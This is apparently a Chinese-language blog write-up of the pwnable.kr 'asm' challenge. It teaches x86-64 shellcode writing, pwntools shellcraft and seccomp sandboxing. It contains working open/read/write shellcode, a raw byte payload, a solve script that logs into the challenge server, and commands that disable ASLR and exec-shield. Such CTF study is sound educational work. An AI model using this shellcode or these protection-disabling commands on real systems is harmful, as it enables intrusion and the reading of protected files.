---
layout: post
date:   2017-07-11 15:14:54
categories: 学习笔记
tags:   linux shellcode pwnable.kr heap
---
# 壹、 linux下基本shellcode的编写 *(pwnable，asm)*

刷到了pwnable.kr中的asm题，开始系统学习shellcode。问题代码专注写利用即可，抽象如下：

	char code[] = "bytecode will go here!";
	int main(int argc, char **argv)
	{
		int (*func)();
		func = (int (*)()) code;
		(int)(*func)();
	}

关闭保护的方法：<br>
echo 0 > /proc/sys/kernel/exec-shield   #turn it off<br>
echo 0 > /proc/sys/kernel/randomize_va_space #turn it off<br>

这里我打算用两个方法写shellcode.
## 1 基础的“写汇编代码”→“汇编”→“提取字节码” 方法。

### Q1: 汇编与生成方法
- 目前我使用如下命令来生成和提取：
```
	$ nasm -f elf64 exit.asm
	$ ld -o exiter exit.o
	$ objdump -d exiter
```
### Q1: 字符串传入?
这里有一个困扰了我的问题，就是字符串怎么传入的问题，这里方法很巧妙，就是把字符串放在末尾，前面使用call的方式，这样字符串的地址就出现在了栈上，就可以pop到想要的寄存器中去了。

### Q2: syscall 和 int 80 不等价？
根据[文档](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)，系统调用应该就是int 0x80的形式，但是我在虚拟机中调试发现int 80 并不能实现syscall的功能，字节码也不一样。
果然在[stackoverflow](https://stackoverflow.com/questions/12806584/what-is-better-int-0x80-or-syscall)上有了回答：

- `syscall` is default way of entering kernel mode on x86-64. This instruction is not available in 32 bit modes of operation on Intel processors.
- `sysenter` is an instruction most frequently used to invoke system calls in 32 bit modes of operation. It is similar to syscall, a bit more difficult to use though, but that is kernel's concern.
- `int 0x80` is a legacy way to invoke a system call and should be avoided.

所以，64位下还是用syscall为好，老旧的kernel再使用int 0x80。

### 题解：
流程是先open，然后read到栈上，再write到标准输出

- shellcode.asm:<br>

```
global _start:
_start:
	jmp short endder;
starter:
	mov rax, 2; sys_open
	pop rdi;
	mov rsi, 0;
	syscall;

	mov rsi, rsp;
	mov rdi, rax;
	xor rax,rax; sys_read
	mov rdx, 100;
	syscall;

	mov rax, 1; sys_write
	mov rdi, 1;
	syscall;

	mov rax, 60;
	syscall;

endder:
	call starter;
	db 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'
```

- solve.py:

```
import pwn

payload = '\xeb0\xb8\x02\x00\x00\x00_\xbe\x00\x00\x00\x00\x0f\x05H\x89\xe6H\x89\xc7H1\xc0\xbad\x00\x00\x00\x0f\x05\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x0f\x05\xb8<\x00\x00\x00\x0f\x05\xe8\xcb\xff\xff\xffthis_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00'
con = pwn.ssh(user='asm', password = 'guest', host = 'pwnable.kr', port = 2222)
tunnel = con.remote('0', 9026)
tunnel.send(payload)
tunnel.interactive()
```
flag: Mak1ng_shelLcodE_i5_veRy_eaSy, [参考链接](https://etenal.me/archives/972#C22)

## 2 使用pwntools工具（pwn.shelldrift）

首先要设置目标环境，学习到两个姿势：

- *方法一*、使用pwn.context(arch="amd64", os = 'linux')设定好目标环境，还可以类似pwn.context.log_level='debug'这样设置目标环境<br>
  然后再使用pwn.shellcraft.*中的各种例如syscall，open，read等方法。
- *方法二*、直接使用pwnlib.shellcraft.amd64.linux.*中的各种例如syscall，open，read等方法
- 以上方法都是生成asm源码，还要用pwn.asm生成对应字节码。<br>
<br>_pwnlib和from pwn import *有点微妙的关系目前还没弄懂_

shellcraft.*中有各种基本的方法，如mov等的操作，写起来和原始汇编差别不大，注意寄存器要写成带引号的字符串形式。同时也有`syscall(syscall=None, arg0=None, arg1=None, arg2=None, arg3=None, arg4=None, arg5=None)`等集成比较好的方法。我们这里用的open、read、write也有集成了。可以参考[pwntools官方文档](https://docs.pwntools.com/en/stable/shellcraft/amd64.html#module-pwnlib.shellcraft.amd64)。<br>

[这里](http://blog.csdn.net/qq_33528164/article/details/71023772)给的题解很清晰明了，连如何放置字符串都不需要考虑（pushstr只有方法一中有）。但是我好奇字符串位置，就把shellcode拿出来看了一下：<br>
<img src="{{ site.baseurl }}/images/{5$]7M213M7TMIQAG}H`9@N.png"><br>
看来这篇博客错了，这里生成的是原始的.asm源码文件，[这里](http://veritas501.space/2017/04/30/pwnable.kr_writeup/)的用法是正确的，还要用pwn.asm生成对应的字节码。不过这里的push字符串的方法可以参考，也是一种方法，拆开成碎片逐个push到栈上。经过测试，我下面这个payload也能够生效的。
```
from pwn import *
context(os='linux', arch='amd64')
asmcode = ''
asmcode += shellcraft.pushstr("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
asmcode += shellcraft.open('rsp',0,0)
asmcode += shellcraft.read('rax','rsp',100)
asmcode += shellcraft.write(1,'rsp',100)
shellcode = asm(asmcode)
```



---
# 贰、 Linux沙箱: seccomp sandbox  *(pwnable, asm)*

Seccomp(secure computing)是Linux kernel （自从2.6.23版本之后）所支持的一种简洁的sandboxing机制。它能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system calls），即read(), write(), exit()和sigreturn()，否则进程便会被终止。

- seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action, int syscall, unsigned int arg_cnt, ...);
- seccomp_rule_add_array(scmp_filter_ctx ctx,
                                  uint32_t action, int syscall,
                                  unsigned int arg_cnt,
- seccomp_rule_add_exact(scmp_filter_ctx ctx, uint32_t action,
                                  int syscall, unsigned int arg_cnt, ...);
- seccomp_rule_add_exact_array(scmp_filter_ctx ctx,
                                        uint32_t action, int syscall,
                                        unsigned int arg_cnt,
                                        const struct scmp_arg_cmp *arg_array);

以上等方法会添加新的过滤器到seccomp过滤器中。这个方法会因为处理器架构的不同而在细节上有一些差异。新添加的filter rule需要通过[seccomp_load(3)](http://man7.org/linux/man-pages/man3/seccomp_load.3.html)来生效。[参见linux man手册](http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html)

如下面是pwnable.kr中asm的题目代码，可以作为一个范例

	#include <seccomp.h>
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	...
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	...
	seccomp_load(ctx); //enable
	seccomp_release(ctx);

表明允许open这一系统调用的进行。

注，gcc编译时应该使用 -lseccomp参数
